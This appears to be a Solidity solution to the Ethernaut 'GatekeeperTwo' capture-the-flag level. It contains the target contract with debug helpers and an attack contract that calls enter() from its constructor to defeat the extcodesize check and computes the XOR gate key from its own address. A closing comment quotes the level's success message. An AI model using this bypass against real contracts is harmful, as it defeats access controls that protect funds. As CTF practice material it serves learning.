
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

    address public entrant;
    uint64 public gate3_msg_sender;
    uint64 public gate3_type_max;
    uint64 public gate3_test;
    bool public gate3_test_bool;
    uint64 public gateKey;
    uint public gate2_test;

    constructor() {
        gate3_msg_sender = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
        gate3_type_max = type(uint64).max;
        gateKey = gate3_type_max - gate3_msg_sender;

        gateTwoTest();
    }

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        _;
    }

    function gateTwoTest() public {
        uint x;
        assembly { x := extcodesize(caller()) }
        gate2_test = x;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function gateThreeTest(bytes8 _gateKey) public {
        gate3_test = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey);
        gate3_test_bool = gate3_test == type(uint64).max;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoAttack {
    address GatekeeperAddr;

    constructor(address _gatekeeper) {
        GatekeeperAddr = _gatekeeper;

        uint64 gate3_msg_sender = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 gate3_type_max = type(uint64).max;
        uint64 _gateKey = gate3_type_max - gate3_msg_sender;

        GatekeeperTwo contract_2_attack = GatekeeperTwo(_gatekeeper);
        contract_2_attack.enter(bytes8(_gateKey));
    }

    function gateTwoTest() public {
        GatekeeperTwo contract_2_attack = GatekeeperTwo(GatekeeperAddr);
        contract_2_attack.gateTwoTest();
    }

    function gateThreeTest(bytes8 _gateKey) public {
        GatekeeperTwo contract_2_attack = GatekeeperTwo(GatekeeperAddr);
        contract_2_attack.gateThreeTest(_gateKey);
    }
}

/*
  Result note:
  Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit or via email and use it to register with the contract at gatekeepertwo.thecyber.eth (be aware that only the first 128 entrants will be accepted by the contract).
 */